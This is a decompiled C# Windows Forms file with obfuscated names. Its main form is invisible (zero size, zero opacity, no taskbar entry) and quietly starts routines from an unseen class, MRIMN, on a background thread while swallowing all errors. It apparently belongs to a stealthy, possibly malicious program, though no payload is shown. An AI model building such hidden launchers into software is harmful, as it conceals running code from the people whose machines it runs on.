using System;
using System.ComponentModel;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;

namespace imndprsw;

public class Form1 : Form
{
	private IContainer components = null;

	private MRIMN mvps = new MRIMN();

	public string carcmrpasPath = "";

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(0, 0));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Form1");
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		try
		{
			((Form)this).set_ShowIcon(false);
			((Form)this).set_ShowInTaskbar(false);
			((Control)this).set_Visible(false);
			mvps.imndprswloadstart();
			((Form)this).set_FormBorderStyle((FormBorderStyle)6);
			ThreadStart start = delegate
			{
				mvps.imndprswopenMe();
			};
			Thread thread = new Thread(start);
			thread.Start();
		}
		catch
		{
		}
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
	}
}
